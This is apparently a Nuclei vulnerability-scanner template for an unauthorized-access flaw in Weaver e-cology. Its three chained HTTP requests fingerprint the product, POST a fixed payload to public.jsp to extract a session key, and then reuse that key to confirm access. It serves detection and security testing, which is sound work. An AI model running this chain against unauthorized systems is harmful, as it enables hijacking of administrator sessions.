id: weaver-ecology-permission-bypass
info:
  name: Weaver e-cology public.jsp file permission bypass
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Weaver e-cology is a large distributed application based on J2EE architecture launched by Shanghai Panmicro Network Co. There is an unauthorized access vulnerability allowing attackers to obtain administrator login cookies and control the entire system.
  tags: permission-bypass
  classification:
    cvss-score: 8.5

flow: http(1) && http(2) && http(3)

http:
  - id: check-index
    method: GET
    path:
      - "/wui/index.html?#/?_key=abcdef"
    headers:
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
      Accept-Language: "en-US,en;q=0.5"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Weaver"
        part: body

  - id: post-public
    method: POST
    path:
      - "/mobilemode/public.jsp"
    headers:
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
      Accept-Language: "en-US,en;q=0.5"
      Content-Type: "application/x-www-form-urlencoded"
      Upgrade-Insecure-Requests: "1"
    body: "from=QRCode&url=CC4DFA20F3CF7CF61F86C43FA6A84C7020E42052CDB6847AEF9362D0FA570CB7"
    extractors:
      - type: regex
        name: session
        group: 1
        regex:
          - "var _sessionkey = \"(.*?)\";"
        internal: true
    matchers:
      - type: word
        words:
          - "_sessionkey"
          - "_appid"
          - "_appHomepageId"
        part: body
      - type: status
        status:
          - 200

  - id: validate-session
    method: GET
    path:
      - "/weaver/weaver.file.ImgFileDownload/.css.map?sessionkey={{session}}"
    headers:
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
      Accept-Language: "en-US,en;q=0.5"
      Content-Type: "application/x-www-form-urlencoded"
      Upgrade-Insecure-Requests: "1"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Success"
